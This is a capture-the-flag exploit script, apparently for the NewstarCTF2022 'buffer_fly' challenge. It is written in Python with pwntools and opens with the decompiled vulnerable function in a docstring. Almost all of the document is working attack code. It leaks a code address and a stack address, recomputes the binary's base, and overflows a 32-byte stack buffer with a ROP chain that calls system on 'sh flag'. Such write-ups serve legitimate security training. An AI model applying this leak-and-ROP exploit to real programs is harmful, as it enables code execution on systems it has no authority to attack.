"""NewstarCTF2022 buffer_fly
泄露函数地址_栈地址
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF
  printf("give me your name: ");
  read(0, buf, 0x20uLL);
  printf("your name: %s\n", buf);
  printf("give me your age: ");
  read(0, buf, 0x20uLL);
  printf("your age: %s\n", buf);
  printf("you are a girl ?\nsusu give me your wechat number: ");
  read(0, buf, 0x40uLL);
  puts("waitting.....");
  sleep(1u);
  close(0);
  close(1);
  return write(2, "hhhhh", 5uLL);
"""
from pwn import *

binary = './buffer_fly'
padding = 0x20

l64 = lambda: u64(s.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
lfn = lambda: u64(s.recvuntil("\x0a")[-7:-1].ljust(8, b"\x00"))

warnings.filterwarnings("ignore", category=BytesWarning)
context(log_level='debug', arch='amd64', os='linux', binary=binary)

s = process()
# gdb.attach(s,'b *$rebase(0x12D3)\nc')
# s = gdb.debug(binary, 'b *$rebase(0x129d)\nc')  # type: process
elf = ELF(binary, checksec=False)

s.sendafter('name:', 'a' * 0x18)  # 泄露出text段函数地址
addr1 = lfn()
success('addr1: ' + hex(addr1))

s.sendafter('age:', 'a' * 0x20)  # 泄露出栈地址
addr2_fn = l64()
success('addr2_fn: ' + hex(addr2_fn))
stack_input = addr2_fn - 0x30

elf.address = addr1 + 8 - 5 - elf.sym['boynextdoor']
pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
system = elf.address + 0x0129D

payload = flat('sh flag\x00', 'a' * 0x20, pop_rdi, stack_input, system)  # 前面是 sh flag\x00', 'a' * 0x20 一共是 0x20 + 8大小
s.sendafter('number: ', payload)

s.interactive()
